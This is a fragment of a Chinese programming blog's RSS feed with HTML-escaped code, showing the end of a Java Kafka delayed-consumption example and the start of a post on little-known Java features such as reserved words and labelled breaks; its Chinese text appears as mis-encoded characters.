&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;synchronized&lt;/span&gt; (lock) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;resume&lt;/span&gt;(consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;paused&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    lock.&lt;span style=&#34;color:#a6e22e&#34;&gt;notify&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }, 0, 1000);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;synchronized&lt;/span&gt; (lock) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ConsumerRecords&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String, String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; consumerRecords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;poll&lt;/span&gt;(Duration.&lt;span style=&#34;color:#a6e22e&#34;&gt;ofMillis&lt;/span&gt;(200));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (consumerRecords.&lt;span style=&#34;color:#a6e22e&#34;&gt;isEmpty&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    lock.&lt;span style=&#34;color:#a6e22e&#34;&gt;wait&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt; timed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (ConsumerRecord&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String, String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; consumerRecord : consumerRecords) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; timestamp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;timestamp&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    TopicPartition topicPartition &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; TopicPartition(consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;topic&lt;/span&gt;(), consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;partition&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (timestamp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 60 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; 1000 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; System.&lt;span style=&#34;color:#a6e22e&#34;&gt;currentTimeMillis&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        String value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        ObjectMapper objectMapper &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectMapper();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        JsonNode jsonNode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; objectMapper.&lt;span style=&#34;color:#a6e22e&#34;&gt;readTree&lt;/span&gt;(value);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        JsonNode jsonNodeTopic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; jsonNode.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;topic&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        String appTopic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, appKey &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, appValue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (jsonNodeTopic &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            appTopic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; jsonNodeTopic.&lt;span style=&#34;color:#a6e22e&#34;&gt;asText&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (appTopic &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        JsonNode jsonNodeKey &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; jsonNode.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (jsonNodeKey &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            appKey &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; jsonNode.&lt;span style=&#34;color:#a6e22e&#34;&gt;asText&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        JsonNode jsonNodeValue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; jsonNode.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (jsonNodeValue &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            appValue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; jsonNodeValue.&lt;span style=&#34;color:#a6e22e&#34;&gt;asText&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#75715e&#34;&gt;// send to application topic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        ProducerRecord&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String, String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; producerRecord &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ProducerRecord&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;(appTopic, appKey, appValue);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            producer.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(producerRecord).&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;// success. commit message&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            OffsetAndMetadata offsetAndMetadata &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; OffsetAndMetadata(consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;offset&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            HashMap&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;TopicPartition, OffsetAndMetadata&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; metadataHashMap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashMap&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            metadataHashMap.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(topicPartition, offsetAndMetadata);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;commitSync&lt;/span&gt;(metadataHashMap);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (ExecutionException e) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;pause&lt;/span&gt;(Collections.&lt;span style=&#34;color:#a6e22e&#34;&gt;singletonList&lt;/span&gt;(topicPartition));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;seek&lt;/span&gt;(topicPartition, consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;offset&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            timed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;pause&lt;/span&gt;(Collections.&lt;span style=&#34;color:#a6e22e&#34;&gt;singletonList&lt;/span&gt;(topicPartition));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        consumer.&lt;span style=&#34;color:#a6e22e&#34;&gt;seek&lt;/span&gt;(topicPartition, consumerRecord.&lt;span style=&#34;color:#a6e22e&#34;&gt;offset&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        timed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (timed) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    lock.&lt;span style=&#34;color:#a6e22e&#34;&gt;wait&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;exit);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ®µç¨‹åºæ˜¯åŸºäºSpringBoot &lt;code&gt;2.4.4&lt;/code&gt;ç‰ˆæœ¬å’Œ kafka-client &lt;code&gt;2.7.0&lt;/code&gt;ç‰ˆæœ¬ç¼–å†™çš„ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œéœ€è¦ä¿®æ”¹ç§æœ‰å˜é‡&lt;code&gt;servers&lt;/code&gt;ä¸ºkafka brokerçš„åœ°å€ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Javaçš„å¥‡æŠ€æ·«å·§</title>
      <link>https://www.typesafe.cn/posts/java-unexpected-features/</link>
      <pubDate>Sat, 13 Mar 2021 13:49:38 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-unexpected-features/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Java&lt;/strong&gt;æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—æœºç¼–ç¨‹è¯­è¨€ã€é¢å‘å¯¹è±¡ã€æ³›å‹ç¼–ç¨‹çš„ç‰¹æ€§ï¼Œå¹¿æ³›åº”ç”¨äºä¼ä¸šçº§Webåº”ç”¨å¼€å‘å’Œç§»åŠ¨åº”ç”¨å¼€å‘ã€‚&lt;/p&gt;
&lt;p&gt;1995å¹´3æœˆ23æ—¥&lt;strong&gt;Sun&lt;/strong&gt;å…¬å¸å‘å¸ƒäº†&lt;strong&gt;Java&lt;/strong&gt;ï¼Œè‡³ä»Šå·²æœ‰è¿‘26å¹´ï¼Œå¯ä»¥è¯´æ˜¯ä¸€é—¨ååˆ†æˆç†Ÿçš„å¼€å‘è¯­è¨€äº†ï¼Œä½†åœ¨æŸäº›ä¸ä¸ºäººçŸ¥çš„åœ°æ–¹å­˜åœ¨ç€ä¸€äº›æ„æ–™ä¹‹å¤–çš„ç‰¹æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;javaçš„ä¿ç•™å…³é”®å­—-gotoå’Œconst&#34;&gt;Javaçš„ä¿ç•™å…³é”®å­— gotoå’Œconst&lt;/h3&gt;
&lt;p&gt;åœ¨&lt;strong&gt;Java&lt;/strong&gt;é‡Œé¢æ²¡æœ‰&lt;code&gt;goto&lt;/code&gt;è¿™ä¸ªåŠŸèƒ½ï¼Œä½†å®ƒä½œä¸ºä¿ç•™å­—æ˜¯æ— æ³•å½“åšå˜é‡æ¥ä½¿ç”¨çš„ï¼Œ&lt;code&gt;const&lt;/code&gt;ä¹Ÿæ˜¯åŒæ ·ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢è¿™ä¸¤è¡Œä»£ç çš„å†™æ³•å­˜åœ¨é—®é¢˜ï¼Œæ— æ³•æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;javaæ ‡ç­¾label&#34;&gt;Javaæ ‡ç­¾Label&lt;/h3&gt;
&lt;p&gt;ä¸Šé¢è¯´äº†åœ¨&lt;strong&gt;Java&lt;/strong&gt;é‡Œé¢æ²¡æœ‰&lt;code&gt;goto&lt;/code&gt;è¿™ä¸ªåŠŸèƒ½ï¼Œä½†ä¸ºäº†å¤„ç†å¤šé‡å¾ªç¯å¼•å…¥äº†Labelï¼Œç›®çš„æ˜¯ä¸ºäº†åœ¨å¤šé‡å¾ªç¯ä¸­æ–¹ä¾¿çš„ä½¿ç”¨ break å’Œcoutinue ï¼Œä½†å¥½åƒåœ¨å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥ç”¨ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;outerLoop:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I&amp;#39;m the outer loop&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I am the inner loop&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; 3) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt; outerLoop;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Complete the loop&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;m the outer loop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I am the inner loop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I am the inner loop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I am the inner loop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Complete the loop
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;test:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt; test; &lt;span style=&#34;color:#75715e&#34;&gt;// works&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;world&amp;#34;&lt;/span&gt;);
